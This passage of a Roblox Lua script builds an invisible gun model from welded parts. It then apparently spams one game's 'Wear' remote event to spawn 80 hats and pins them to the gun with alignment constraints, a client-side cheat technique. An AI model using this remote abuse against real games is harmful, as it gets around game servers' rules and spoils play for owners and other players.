	Weld29 = Instance.new("Weld")
	Part30 = Instance.new("Part")
	Weld31 = Instance.new("Weld")
	Part32 = Instance.new("Part")
	Weld33 = Instance.new("Weld")
	Part34 = Instance.new("Part")
	Weld35 = Instance.new("Weld")
	Part36 = Instance.new("Part")
	Weld37 = Instance.new("Weld")
	Part38 = Instance.new("Part")
	Weld39 = Instance.new("Weld")
	Part40 = Instance.new("Part")
	Weld41 = Instance.new("Weld")
	Part42 = Instance.new("Part")
	Weld43 = Instance.new("Weld")
	Part44 = Instance.new("Part")
	Weld45 = Instance.new("Weld")
	Part46 = Instance.new("Part")
	Weld47 = Instance.new("Weld")
	Part48 = Instance.new("Part")
	Weld49 = Instance.new("Weld")
	Part50 = Instance.new("Part")
	Weld51 = Instance.new("Weld")
	Part52 = Instance.new("Part")
	Weld53 = Instance.new("Weld")
	Part54 = Instance.new("Part")
	Weld55 = Instance.new("Weld")
	Part56 = Instance.new("Part")
	Weld57 = Instance.new("Weld")
	Part58 = Instance.new("Part")
	Weld59 = Instance.new("Weld")
	Motor6D60 = Instance.new("Motor6D")
	Model0.Name = "TheGun"
	Model0.Parent = mas
	Part1.Name = "Handle"
	Part1.Parent = Model0
	Part1.CFrame = CFrame.new(-61.4719009, 4.04184484, -15.087183, 1, 0, 0, 0, 1.00000012, 0, 0, 0, 1.00000012)
	Part1.Position = Vector3.new(-61.471900939941, 4.0418448448181, -15.087182998657)
	Part1.Transparency = 1
	Part1.Size = Vector3.new(1, 1, 1)
	Part1.BottomSurface = Enum.SurfaceType.Smooth
	Part1.CanCollide = false
	Part1.TopSurface = Enum.SurfaceType.Smooth
	Part2.Parent = Part1
	Part2.CFrame = CFrame.new(-61.4719009, 4.57125092, -13.5770187, 1, 0, 0, 0, 1.00000012, 0, 0, 0, 1.00000012)
	Part2.Position = Vector3.new(-61.471900939941, 4.5712509155273, -13.577018737793)
	Part2.Transparency = 1
	Part2.Size = Vector3.new(1, 1, 1)
	Part2.Anchored = false
	Part2.BottomSurface = Enum.SurfaceType.Smooth
	Part2.CanCollide = false
	Part2.TopSurface = Enum.SurfaceType.Smooth
	Weld3.Name = "Part"
	Weld3.Parent = Part2
	Weld3.C1 = CFrame.new(0, -0.529406071, -1.51016426, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	Weld3.Part0 = Part1
	Weld3.Part1 = Part2
	Weld3.part1 = Part2
	Part4.Parent = Part1
	Part4.CFrame = CFrame.new(-61.4719009, 3.82369685, -16.5392818, 1, 0, 0, 0, 0.999388993, -0.0349550769, 0, 0.0349550769, 0.999388993)
	Part4.Orientation = Vector3.new(2, 0, 0)
	Part4.Position = Vector3.new(-61.471900939941, 3.8236968517303, -16.539281845093)
	Part4.Rotation = Vector3.new(2, 0, 0)
	Part4.Transparency = 1
	Part4.Size = Vector3.new(1, 1, 1)
	Part4.Anchored = false
	Part4.BottomSurface = Enum.SurfaceType.Smooth
	Part4.CanCollide = false
	Part4.TopSurface = Enum.SurfaceType.Smooth
	Weld5.Name = "Part"
	Weld5.Parent = Part4
	Weld5.C1 = CFrame.new(0, 0.268815994, 1.44359016, 1, -0, 0, 0, 0.999388874, 0.0349550731, -0, -0.0349550731, 0.999388874)
	Weld5.Part0 = Part1
	Weld5.Part1 = Part4
	Weld5.part1 = Part4
	Part6.Parent = Part1
	Part6.CFrame = CFrame.new(-61.4719009, 5.01883221, -17.6148586, 1, 0, 0, 0, 0.948746204, -0.316039354, 0, 0.316039354, 0.948746204)
	Part6.Orientation = Vector3.new(18.420000076294, 0, 0)
	Part6.Position = Vector3.new(-61.471900939941, 5.0188322067261, -17.614858627319)
	Part6.Rotation = Vector3.new(18.420000076294, 0, 0)
	Part6.Transparency = 1
	Part6.Size = Vector3.new(1, 1, 1)
	Part6.Anchored = false
	Part6.BottomSurface = Enum.SurfaceType.Smooth
	Part6.CanCollide = false
	Part6.TopSurface = Enum.SurfaceType.Smooth
	Weld7.Name = "Part"
	Weld7.Parent = Part6
	Weld7.C1 = CFrame.new(0, -0.12803936, 2.70689774, 1, -0, 0, 0, 0.948746085, 0.316039324, -0, -0.316039324, 0.948746085)
	Weld7.Part0 = Part1
	Weld7.Part1 = Part6
	Weld7.part1 = Part6
	Part8.Parent = Part1
	Part8.CFrame = CFrame.new(-61.4719009, 5.06346798, -15.6957617, 1, 0, 0, 0, 0.874146879, 0.485662013, 0, -0.485662013, 0.874146879)
	Part8.Orientation = Vector3.new(-29.059999465942, 0, 0)
	Part8.Position = Vector3.new(-61.471900939941, 5.0634679794312, -15.695761680603)
	Part8.Rotation = Vector3.new(-29.059999465942, 0, 0)
	Part8.Transparency = 1
	Part8.Size = Vector3.new(1, 1, 1)
	Part8.Anchored = false
	Part8.BottomSurface = Enum.SurfaceType.Smooth
	Part8.CanCollide = false
	Part8.TopSurface = Enum.SurfaceType.Smooth
	Weld9.Name = "Part"
	Weld9.Parent = Part8
	Weld9.C1 = CFrame.new(0, -1.1886158, 0.0358066559, 1, 0, 0, 0, 0.87414676, -0.485661954, 0, 0.485661954, 0.87414676)
	Weld9.Part0 = Part1
	Weld9.Part1 = Part8
	Weld9.part1 = Part8
	Part10.Parent = Part1
	Part10.CFrame = CFrame.new(-61.4719009, 3.70948672, -17.7032681, 1, 0, 0, 0, 0.902064681, 0.431601226, 0, -0.431601226, 0.902064681)
	Part10.Orientation = Vector3.new(-25.569999694824, 0, 0)
	Part10.Position = Vector3.new(-61.471900939941, 3.7094867229462, -17.703268051147)
	Part10.Rotation = Vector3.new(-25.569999694824, 0, 0)
	Part10.Transparency = 1
	Part10.Size = Vector3.new(1, 1, 1)
	Part10.Anchored = false
	Part10.BottomSurface = Enum.SurfaceType.Smooth
	Part10.CanCollide = false
	Part10.TopSurface = Enum.SurfaceType.Smooth
	Weld11.Name = "Part"
	Weld11.Parent = Part10
	Weld11.C1 = CFrame.new(0, -0.829406738, 2.5032959, 1, 0, 0, 0, 0.902064562, -0.431601167, 0, 0.431601167, 0.902064562)
	Weld11.Part0 = Part1
	Weld11.Part1 = Part10
	Weld11.part1 = Part10
	Part12.Parent = Part1
	Part12.CFrame = CFrame.new(-61.4719009, 3.81350684, -17.4525204, 1, 0, 0, 0, 0.999388993, -0.0349550769, 0, 0.0349550769, 0.999388993)
	Part12.Orientation = Vector3.new(2, 0, 0)
	Part12.Position = Vector3.new(-61.471900939941, 3.8135068416595, -17.452520370483)
	Part12.Rotation = Vector3.new(2, 0, 0)
	Part12.Transparency = 1
	Part12.Size = Vector3.new(1, 1, 1)
	Part12.Anchored = false
	Part12.BottomSurface = Enum.SurfaceType.Smooth
	Part12.CanCollide = false
	Part12.TopSurface = Enum.SurfaceType.Smooth
	Weld13.Name = "Part"
	Weld13.Parent = Part12
	Weld13.C1 = CFrame.new(0, 0.310956955, 2.35591316, 1, -0, 0, 0, 0.999388874, 0.0349550731, -0, -0.0349550731, 0.999388874)
	Weld13.Part0 = Part1
	Weld13.Part1 = Part12
	Weld13.part1 = Part12
	Part14.Parent = Part1
	Part14.CFrame = CFrame.new(-61.4719009, 4.40918064, -15.0871811, 1, 0, 0, 0, 1.00000012, 0, 0, 0, 1.00000012)
	Part14.Position = Vector3.new(-61.471900939941, 4.4091806411743, -15.087181091309)
	Part14.Transparency = 1
	Part14.Size = Vector3.new(1, 1, 1)
	Part14.Anchored = false
	Part14.BottomSurface = Enum.SurfaceType.Smooth
	Part14.CanCollide = false
	Part14.TopSurface = Enum.SurfaceType.Smooth
	Weld15.Name = "Part"
	Weld15.Parent = Part14
	Weld15.C1 = CFrame.new(0, -0.367333412, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	Weld15.Part0 = Part1
	Weld15.Part1 = Part14
	Weld15.part1 = Part14
	Part16.Parent = Part1
	Part16.CFrame = CFrame.new(-61.4719009, 5.18177509, -22.2191982, 1, 0, 0, 0, 0.999996066, -0.00284862379, 0, 0.00284862379, 0.999996066)
	Part16.Orientation = Vector3.new(0.15999999642372, 0, 0)
	Part16.Position = Vector3.new(-61.471900939941, 5.1817750930786, -22.219198226929)
	Part16.Rotation = Vector3.new(0.15999999642372, 0, 0)
	Part16.Transparency = 1
	Part16.Size = Vector3.new(1, 1, 1)
	Part16.Anchored = false
	Part16.BottomSurface = Enum.SurfaceType.Smooth
	Part16.CanCollide = false
	Part16.TopSurface = Enum.SurfaceType.Smooth
	Weld17.Name = "Part"
	Weld17.Parent = Part16
	Weld17.C1 = CFrame.new(0, -1.11990595, 7.13519096, 1, -0, 0, 0, 0.999995947, 0.00284862355, -0, -0.00284862355, 0.999995947)
	Weld17.Part0 = Part1
	Weld17.Part1 = Part16
	Weld17.part1 = Part16
	Part18.Parent = Part1
	Part18.CFrame = CFrame.new(-61.4719009, 3.53503871, -19.4109554, 1, 0, 0, 0, 0.999996066, -0.00284862379, 0, 0.00284862379, 0.999996066)
	Part18.Orientation = Vector3.new(0.15999999642372, 0, 0)
	Part18.Position = Vector3.new(-61.471900939941, 3.5350387096405, -19.410955429077)
	Part18.Rotation = Vector3.new(0.15999999642372, 0, 0)
	Part18.Transparency = 1
	Part18.Size = Vector3.new(1, 1, 1)
	Part18.Anchored = false
	Part18.BottomSurface = Enum.SurfaceType.Smooth
	Part18.CanCollide = false
	Part18.TopSurface = Enum.SurfaceType.Smooth
	Weld19.Name = "Part"
	Weld19.Parent = Part18
	Weld19.C1 = CFrame.new(0, 0.518955231, 4.32233429, 1, -0, 0, 0, 0.999995947, 0.00284862355, -0, -0.00284862355, 0.999995947)
	Weld19.Part0 = Part1
	Weld19.Part1 = Part18
	Weld19.part1 = Part18
	Part20.Parent = Part1
	Part20.CFrame = CFrame.new(-61.4719009, 4.20391083, -14.0725174, 1, 0, 0, 0, 1.00000012, 0, 0, 0, 1.00000012)
	Part20.Position = Vector3.new(-61.471900939941, 4.2039108276367, -14.07251739502)
	Part20.Transparency = 1
	Part20.Size = Vector3.new(1, 1, 1)
	Part20.Anchored = false
	Part20.BottomSurface = Enum.SurfaceType.Smooth
	Part20.CanCollide = false
	Part20.TopSurface = Enum.SurfaceType.Smooth
	Weld21.Name = "Part"
	Weld21.Parent = Part20
	Weld21.C1 = CFrame.new(0, -0.162072659, -1.01466179, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	Weld21.Part0 = Part1
	Weld21.Part1 = Part20
	Weld21.part1 = Part20
	Part22.Parent = Part1
	Part22.CFrame = CFrame.new(-61.4719009, 5.1791048, -21.2691708, 1, 0, 0, 0, 0.999996066, -0.00284862379, 0, 0.00284862379, 0.999996066)
	Part22.Orientation = Vector3.new(0.15999999642372, 0, 0)
	Part22.Position = Vector3.new(-61.471900939941, 5.1791048049927, -21.269170761108)
	Part22.Rotation = Vector3.new(0.15999999642372, 0, 0)
	Part22.Transparency = 1
	Part22.Size = Vector3.new(1, 1, 1)
	Part22.Anchored = false
	Part22.BottomSurface = Enum.SurfaceType.Smooth
	Part22.CanCollide = false
	Part22.TopSurface = Enum.SurfaceType.Smooth
	Weld23.Name = "Part"
	Weld23.Parent = Part22
	Weld23.C1 = CFrame.new(0, -1.11990595, 6.18515205, 1, -0, 0, 0, 0.999995947, 0.00284862355, -0, -0.00284862355, 0.999995947)
	Weld23.Part0 = Part1
	Weld23.Part1 = Part22
	Weld23.part1 = Part22
	Part24.Parent = Part1
	Part24.CFrame = CFrame.new(-61.4719009, 4.7585144, -17.5827389, 1, 0, 0, 0, 0.969546318, -0.244908512, 0, 0.244908512, 0.969546318)
	Part24.Orientation = Vector3.new(14.180000305176, 0, 0)
	Part24.Position = Vector3.new(-61.471900939941, 4.7585144042969, -17.582738876343)
	Part24.Rotation = Vector3.new(14.180000305176, 0, 0)
	Part24.Transparency = 1
	Part24.Size = Vector3.new(1, 1, 1)
	Part24.Anchored = false
	Part24.BottomSurface = Enum.SurfaceType.Smooth
	Part24.CanCollide = false
	Part24.TopSurface = Enum.SurfaceType.Smooth
	Weld25.Name = "Part"
	Weld25.Parent = Part24
	Weld25.C1 = CFrame.new(0, -0.0837335587, 2.59508896, 1, -0, 0, 0, 0.969546199, 0.244908482, -0, -0.244908482, 0.969546199)
	Weld25.Part0 = Part1
	Weld25.Part1 = Part24
	Weld25.part1 = Part24
	Part26.Parent = Part1
	Part26.CFrame = CFrame.new(-61.4719009, 4.29126835, -17.9034176, 1, 0, 0, 0, 0.320580453, 0.947221577, 0, -0.947221577, 0.320580453)
	Part26.Orientation = Vector3.new(-71.300003051758, 0, 0)
	Part26.Position = Vector3.new(-61.471900939941, 4.2912683486938, -17.90341758728)
	Part26.Rotation = Vector3.new(-71.300003051758, 0, 0)
	Part26.Transparency = 1
	Part26.Size = Vector3.new(1, 1, 1)
	Part26.Anchored = false
	Part26.BottomSurface = Enum.SurfaceType.Smooth
	Part26.CanCollide = false
	Part26.TopSurface = Enum.SurfaceType.Smooth
	Weld27.Name = "Part"
	Weld27.Parent = Part26
	Weld27.C1 = CFrame.new(0, -2.74759102, 0.666440964, 1, 0, 0, 0, 0.320580423, -0.947221458, 0, 0.947221458, 0.320580423)
	Weld27.Part0 = Part1
	Weld27.Part1 = Part26
	Weld27.part1 = Part26
	Part28.Parent = Part1
	Part28.CFrame = CFrame.new(-61.4719009, 4.29135895, -16.8153133, 1, 0, 0, 0, 0.999388993, -0.0349550769, 0, 0.0349550769, 0.999388993)
	Part28.Orientation = Vector3.new(2, 0, 0)
	Part28.Position = Vector3.new(-61.471900939941, 4.2913589477539, -16.815313339233)
	Part28.Rotation = Vector3.new(2, 0, 0)
	Part28.Transparency = 1
	Part28.Size = Vector3.new(1, 1, 1)
	Part28.Anchored = false
	Part28.BottomSurface = Enum.SurfaceType.Smooth
	Part28.CanCollide = false
	Part28.TopSurface = Enum.SurfaceType.Smooth
	Weld29.Name = "Part"
	Weld29.Parent = Part28
	Weld29.C1 = CFrame.new(0, -0.188891411, 1.7358036, 1, -0, 0, 0, 0.999388874, 0.0349550731, -0, -0.0349550731, 0.999388874)
	Weld29.Part0 = Part1
	Weld29.Part1 = Part28
	Weld29.part1 = Part28
	Part30.Parent = Part1
	Part30.CFrame = CFrame.new(-61.4719009, 4.46866894, -15.998312, 1, 0, 0, 0, 1.00000012, 0, 0, 0, 1.00000012)
	Part30.Position = Vector3.new(-61.471900939941, 4.4686689376831, -15.99831199646)
	Part30.Transparency = 1
	Part30.Size = Vector3.new(1, 1, 1)
	Part30.Anchored = false
	Part30.BottomSurface = Enum.SurfaceType.Smooth
	Part30.CanCollide = false
	Part30.TopSurface = Enum.SurfaceType.Smooth
	Weld31.Name = "Part"
	Weld31.Parent = Part30
	Weld31.C1 = CFrame.new(0, -0.426823616, 0.91113472, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	Weld31.Part0 = Part1
	Weld31.Part1 = Part30
	Weld31.part1 = Part30
	Part32.Parent = Part1
	Part32.CFrame = CFrame.new(-61.4719009, 4.76645374, -16.6967525, 1, 0, 0, 0, 1.00000012, 0, 0, 0, 1.00000012)
	Part32.Position = Vector3.new(-61.471900939941, 4.766453742981, -16.696752548218)
	Part32.Transparency = 1
	Part32.Size = Vector3.new(1, 1, 1)
	Part32.Anchored = false
	Part32.BottomSurface = Enum.SurfaceType.Smooth
	Part32.CanCollide = false
	Part32.TopSurface = Enum.SurfaceType.Smooth
	Weld33.Name = "Part"
	Weld33.Parent = Part32
	Weld33.C1 = CFrame.new(0, -0.724611759, 1.60957909, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	Weld33.Part0 = Part1
	Weld33.Part1 = Part32
	Weld33.part1 = Part32
	Part34.Parent = Part1
	Part34.CFrame = CFrame.new(-61.4719009, 5.19678879, -15.0871811, 1, 0, 0, 0, 1.00000012, 0, 0, 0, 1.00000012)
	Part34.Position = Vector3.new(-61.471900939941, 5.1967887878418, -15.087181091309)
	Part34.Transparency = 1
	Part34.Size = Vector3.new(1, 1, 1)
	Part34.Anchored = false
	Part34.BottomSurface = Enum.SurfaceType.Smooth
	Part34.CanCollide = false
	Part34.TopSurface = Enum.SurfaceType.Smooth
	Weld35.Name = "Part"
	Weld35.Parent = Part34
	Weld35.C1 = CFrame.new(0, -1.15494823, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	Weld35.Part0 = Part1
	Weld35.Part1 = Part34
	Weld35.part1 = Part34
	Part36.Parent = Part1
	Part36.CFrame = CFrame.new(-61.4719009, 3.53228784, -18.4356136, 1, 0, 0, 0, 0.999996066, -0.00284862379, 0, 0.00284862379, 0.999996066)
	Part36.Orientation = Vector3.new(0.15999999642372, 0, 0)
	Part36.Position = Vector3.new(-61.471900939941, 3.5322878360748, -18.435613632202)
	Part36.Rotation = Vector3.new(0.15999999642372, 0, 0)
	Part36.Transparency = 1
	Part36.Size = Vector3.new(1, 1, 1)
	Part36.Anchored = false
	Part36.BottomSurface = Enum.SurfaceType.Smooth
	Part36.CanCollide = false
	Part36.TopSurface = Enum.SurfaceType.Smooth
	Weld37.Name = "Part"
	Weld37.Parent = Part36
	Weld37.C1 = CFrame.new(0, 0.518954277, 3.34699059, 1, -0, 0, 0, 0.999995947, 0.00284862355, -0, -0.00284862355, 0.999995947)
	Weld37.Part0 = Part1
	Weld37.Part1 = Part36
	Weld37.part1 = Part36
	Part38.Parent = Part1
	Part38.CFrame = CFrame.new(-61.4719009, 4.20391083, -13.5770187, 1, 0, 0, 0, 1.00000012, 0, 0, 0, 1.00000012)
	Part38.Position = Vector3.new(-61.471900939941, 4.2039108276367, -13.577018737793)
	Part38.Transparency = 1
	Part38.Size = Vector3.new(1, 1, 1)
	Part38.Anchored = false
	Part38.BottomSurface = Enum.SurfaceType.Smooth
	Part38.CanCollide = false
	Part38.TopSurface = Enum.SurfaceType.Smooth
	Weld39.Name = "Part"
	Weld39.Parent = Part38
	Weld39.C1 = CFrame.new(0, -0.162072659, -1.51016426, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	Weld39.Part0 = Part1
	Weld39.Part1 = Part38
	Weld39.part1 = Part38
	Part40.Parent = Part1
	Part40.CFrame = CFrame.new(-61.4719009, 3.7392056, -12.6632156, 1, 0, 0, 0, 1.00000012, 0, 0, 0, 1.00000012)
	Part40.Position = Vector3.new(-61.471900939941, 3.7392055988312, -12.663215637207)
	Part40.Transparency = 1
	Part40.Size = Vector3.new(1, 1, 1)
	Part40.Anchored = false
	Part40.BottomSurface = Enum.SurfaceType.Smooth
	Part40.CanCollide = false
	Part40.TopSurface = Enum.SurfaceType.Smooth
	Weld41.Name = "Part"
	Weld41.Parent = Part40
	Weld41.C1 = CFrame.new(0, 0.302639961, -2.42396164, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	Weld41.Part0 = Part1
	Weld41.Part1 = Part40
	Weld41.part1 = Part40
	Part42.Parent = Part1
	Part42.CFrame = CFrame.new(-61.4719009, 4.71275616, -12.6632156, 1, 0, 0, 0, 1.00000012, 0, 0, 0, 1.00000012)
	Part42.Position = Vector3.new(-61.471900939941, 4.7127561569214, -12.663215637207)
	Part42.Transparency = 1
	Part42.Size = Vector3.new(1, 1, 1)
	Part42.Anchored = false
	Part42.BottomSurface = Enum.SurfaceType.Smooth
	Part42.CanCollide = false
	Part42.TopSurface = Enum.SurfaceType.Smooth
	Weld43.Name = "Part"
	Weld43.Parent = Part42
	Weld43.C1 = CFrame.new(0, -0.670910835, -2.42396164, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	Weld43.Part0 = Part1
	Weld43.Part1 = Part42
	Weld43.part1 = Part42
	Part44.Parent = Part1
	Part44.CFrame = CFrame.new(-61.4719009, 3.54025149, -21.2737637, 1, 0, 0, 0, 0.999996066, -0.00284862379, 0, 0.00284862379, 0.999996066)
	Part44.Orientation = Vector3.new(0.15999999642372, 0, 0)
	Part44.Position = Vector3.new(-61.471900939941, 3.540251493454, -21.273763656616)
	Part44.Rotation = Vector3.new(0.15999999642372, 0, 0)
	Part44.Transparency = 1
	Part44.Size = Vector3.new(1, 1, 1)
	Part44.Anchored = false
	Part44.BottomSurface = Enum.SurfaceType.Smooth
	Part44.CanCollide = false
	Part44.TopSurface = Enum.SurfaceType.Smooth
	Weld45.Name = "Part"
	Weld45.Parent = Part44
	Weld45.C1 = CFrame.new(0, 0.518954754, 6.18515205, 1, -0, 0, 0, 0.999995947, 0.00284862355, -0, -0.00284862355, 0.999995947)
	Weld45.Part0 = Part1
	Weld45.Part1 = Part44
	Weld45.part1 = Part44
	Part46.Parent = Part1
	Part46.CFrame = CFrame.new(-61.4719009, 3.53758359, -20.3241787, 1, 0, 0, 0, 0.999996066, -0.00284862379, 0, 0.00284862379, 0.999996066)
	Part46.Orientation = Vector3.new(0.15999999642372, 0, 0)
	Part46.Position = Vector3.new(-61.471900939941, 3.5375835895538, -20.324178695679)
	Part46.Rotation = Vector3.new(0.15999999642372, 0, 0)
	Part46.Transparency = 1
	Part46.Size = Vector3.new(1, 1, 1)
	Part46.Anchored = false
	Part46.BottomSurface = Enum.SurfaceType.Smooth
	Part46.CanCollide = false
	Part46.TopSurface = Enum.SurfaceType.Smooth
	Weld47.Name = "Part"
	Weld47.Parent = Part46
	Weld47.C1 = CFrame.new(0, 0.518955231, 5.235569, 1, -0, 0, 0, 0.999995947, 0.00284862355, -0, -0.00284862355, 0.999995947)
	Weld47.Part0 = Part1
	Weld47.Part1 = Part46
	Weld47.part1 = Part46
	Part48.Parent = Part1
	Part48.CFrame = CFrame.new(-61.4719009, 4.57125092, -14.0725174, 1, 0, 0, 0, 1.00000012, 0, 0, 0, 1.00000012)
	Part48.Position = Vector3.new(-61.471900939941, 4.5712509155273, -14.07251739502)
	Part48.Transparency = 1
	Part48.Size = Vector3.new(1, 1, 1)
	Part48.Anchored = false
	Part48.BottomSurface = Enum.SurfaceType.Smooth
	Part48.CanCollide = false
	Part48.TopSurface = Enum.SurfaceType.Smooth
	Weld49.Name = "Part"
	Weld49.Parent = Part48
	Weld49.C1 = CFrame.new(0, -0.529406071, -1.01466179, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	Weld49.Part0 = Part1
	Weld49.Part1 = Part48
	Weld49.part1 = Part48
	Part50.Parent = Part1
	Part50.CFrame = CFrame.new(-61.4719009, 3.90539575, -15.9466305, 1, 0, 0, 0, 0.971143901, 0.238494888, 0, -0.238494888, 0.971143901)
	Part50.Orientation = Vector3.new(-13.800000190735, 0, 0)
	Part50.Position = Vector3.new(-61.471900939941, 3.9053957462311, -15.946630477905)
	Part50.Rotation = Vector3.new(-13.800000190735, 0, 0)
	Part50.Transparency = 1
	Part50.Size = Vector3.new(1, 1, 1)
	Part50.Anchored = false
	Part50.BottomSurface = Enum.SurfaceType.Smooth
	Part50.CanCollide = false
	Part50.TopSurface = Enum.SurfaceType.Smooth
	Weld51.Name = "Part"
	Weld51.Parent = Part50
	Weld51.C1 = CFrame.new(0, -0.0724973679, 0.867191315, 1, 0, 0, 0, 0.971143782, -0.238494858, 0, 0.238494858, 0.971143782)
	Weld51.Part0 = Part1
	Weld51.Part1 = Part50
	Weld51.part1 = Part50
	Part52.Parent = Part1
	Part52.CFrame = CFrame.new(-61.4719009, 3.54291081, -22.2237911, 1, 0, 0, 0, 0.999996066, -0.00284862379, 0, 0.00284862379, 0.999996066)
	Part52.Orientation = Vector3.new(0.15999999642372, 0, 0)
	Part52.Position = Vector3.new(-61.471900939941, 3.5429108142853, -22.223791122437)
	Part52.Rotation = Vector3.new(0.15999999642372, 0, 0)
	Part52.Transparency = 1
	Part52.Size = Vector3.new(1, 1, 1)
	Part52.Anchored = false
	Part52.BottomSurface = Enum.SurfaceType.Smooth
	Part52.CanCollide = false
	Part52.TopSurface = Enum.SurfaceType.Smooth
	Weld53.Name = "Part"
	Weld53.Parent = Part52
	Weld53.C1 = CFrame.new(0, 0.518954754, 7.13519096, 1, -0, 0, 0, 0.999995947, 0.00284862355, -0, -0.00284862355, 0.999995947)
	Weld53.Part0 = Part1
	Weld53.Part1 = Part52
	Weld53.part1 = Part52
	Part54.Parent = Part1
	Part54.CFrame = CFrame.new(-61.4719009, 5.17388535, -19.4063473, 1, 0, 0, 0, 0.999996066, -0.00284862379, 0, 0.00284862379, 0.999996066)
	Part54.Orientation = Vector3.new(0.15999999642372, 0, 0)
	Part54.Position = Vector3.new(-61.471900939941, 5.173885345459, -19.40634727478)
	Part54.Rotation = Vector3.new(0.15999999642372, 0, 0)
	Part54.Transparency = 1
	Part54.Size = Vector3.new(1, 1, 1)
	Part54.Anchored = false
	Part54.BottomSurface = Enum.SurfaceType.Smooth
	Part54.CanCollide = false
	Part54.TopSurface = Enum.SurfaceType.Smooth
	Weld55.Name = "Part"
	Weld55.Parent = Part54
	Weld55.C1 = CFrame.new(0, -1.11990595, 4.3223362, 1, -0, 0, 0, 0.999995947, 0.00284862355, -0, -0.00284862355, 0.999995947)
	Weld55.Part0 = Part1
	Weld55.Part1 = Part54
	Weld55.part1 = Part54
	Part56.Parent = Part1
	Part56.CFrame = CFrame.new(-61.4719009, 5.17114258, -18.4310055, 1, 0, 0, 0, 0.999996066, -0.00284862379, 0, 0.00284862379, 0.999996066)
	Part56.Orientation = Vector3.new(0.15999999642372, 0, 0)
	Part56.Position = Vector3.new(-61.471900939941, 5.171142578125, -18.431005477905)
	Part56.Rotation = Vector3.new(0.15999999642372, 0, 0)
	Part56.Transparency = 1
	Part56.Size = Vector3.new(1, 1, 1)
	Part56.Anchored = false
	Part56.BottomSurface = Enum.SurfaceType.Smooth
	Part56.CanCollide = false
	Part56.TopSurface = Enum.SurfaceType.Smooth
	Weld57.Name = "Part"
	Weld57.Parent = Part56
	Weld57.C1 = CFrame.new(0, -1.11990595, 3.34699249, 1, -0, 0, 0, 0.999995947, 0.00284862355, -0, -0.00284862355, 0.999995947)
	Weld57.Part0 = Part1
	Weld57.Part1 = Part56
	Weld57.part1 = Part56
	Part58.Parent = Part1
	Part58.CFrame = CFrame.new(-61.4719009, 5.17643929, -20.3195858, 1, 0, 0, 0, 0.999996066, -0.00284862379, 0, 0.00284862379, 0.999996066)
	Part58.Orientation = Vector3.new(0.15999999642372, 0, 0)
	Part58.Position = Vector3.new(-61.471900939941, 5.1764392852783, -20.319585800171)
	Part58.Rotation = Vector3.new(0.15999999642372, 0, 0)
	Part58.Transparency = 1
	Part58.Size = Vector3.new(1, 1, 1)
	Part58.Anchored = false
	Part58.BottomSurface = Enum.SurfaceType.Smooth
	Part58.CanCollide = false
	Part58.TopSurface = Enum.SurfaceType.Smooth
	Weld59.Name = "Part"
	Weld59.Parent = Part58
	Weld59.C1 = CFrame.new(0, -1.11990595, 5.23557091, 1, -0, 0, 0, 0.999995947, 0.00284862355, -0, -0.00284862355, 0.999995947)
	Weld59.Part0 = Part1
	Weld59.Part1 = Part58
	Weld59.part1 = Part58
	Part1.Anchored = true
	Motor6D60.Name = "Handle"
	Motor6D60.Parent = Part1
	Motor6D60.C0 = CFrame.new(-0.0235900879, -0.361895561, -0.89873004, 1, 8.84009959e-16, 0, 0, -0.0334812626, 0.999435842, -1.11022302e-15, -0.999434054, -0.033482302)
	Motor6D60.Part1 = Part1
	Motor6D60.part1 = Part1
	for i,v in pairs(mas:GetChildren()) do
		v.Parent = script
		pcall(function() v:MakeJoints() end)
	end
	mas:Destroy()
	for i,v in pairs(cors) do
		spawn(function()
			pcall(v)
		end)
	end

	GunTip = Instance.new("Attachment")
	GunTip.Parent = Part1
	GunTip.Position = Vector3.new(0, 0.35829448699951, -7.3915157318115)
	GunWeld = Motor6D60
	local GUNMODEL = Model0
	GUNMODEL.Parent = workspace




	function StickParts(Part0,Part1)
		local AlignPos = Instance.new('AlignPosition', Part1)
		AlignPos.ApplyAtCenterOfMass = true;
		AlignPos.MaxForce = 67752;
		AlignPos.MaxVelocity = math.huge/9e110;
		AlignPos.ReactionForceEnabled = false;
		AlignPos.Responsiveness = 200;
		AlignPos.RigidityEnabled = false;
		local AlignOri = Instance.new('AlignOrientation', Part1)
		AlignOri.MaxAngularVelocity = math.huge/9e110;
		AlignOri.MaxTorque = 67752;
		AlignOri.PrimaryAxisOnly = false;
		AlignOri.ReactionTorqueEnabled = false;
		AlignOri.Responsiveness = 200;
		AlignOri.RigidityEnabled = false;
		local AttachmentA=Instance.new('Attachment',Part1)
		local AttachmentB=Instance.new('Attachment',Part0)
		local AttachmentC=Instance.new('Attachment',Part1)
		local AttachmentD=Instance.new('Attachment',Part0)
		AlignPos.Attachment1 = AttachmentA;
		AlignPos.Attachment0 = AttachmentB;
		AlignOri.Attachment1 = AttachmentC;
		AlignOri.Attachment0 = AttachmentD;


	end
	function roundVector(vector, unit)
		return vector - Vector3.new(vector.X%unit, vector.Y%unit, vector.Z%unit)
	end

	local GenerateHats = function(amount)
		Msgreq("Creo's HatGen V1.4","Generating Parts (May take a while, just bear with it)",7)
		local AM = 0
		local S = Player.Character.DescendantAdded:Connect(function(thing)
			if thing:IsA("Accessory") then

				thing:WaitForChild("Handle")
				thing.Handle:FindFirstChildWhichIsA("SpecialMesh")
				thing.Handle:FindFirstChildWhichIsA("Weld")
				AM = AM + 1
				table.insert(SETHATS,(#SETHATS)+1,thing.Handle)
			end
		end)
		repeat
			game:GetService("RunService").Stepped:wait()   
			local args = {
				[1] = {
					[1] = "Wear",
					[2] = "11297746",
					[3] = "Hats"
				}
			}
			WEARITEMTHING:FireServer(unpack(args))
		until AM >= amount
		S:Disconnect()
		return "done~"
	end





	LoadingText.Text = "Generating parts, please wait."
	if HatLoad == true then
		repeat wait() until GenerateHats(80) == "done~"
	end
	script.Parent = nil
	Player.Character.HumanoidRootPart.CFrame = StartPosition
	Player.Character.HumanoidRootPart.Anchored = false




	local NotificationBindable = Instance.new("BindableFunction")
	local Msgreq = function(Title,Text,Duration,Button1Text,Button2Text)
		game.StarterGui:SetCore("SendNotification", {
			Title = Title;
			Text = Text;
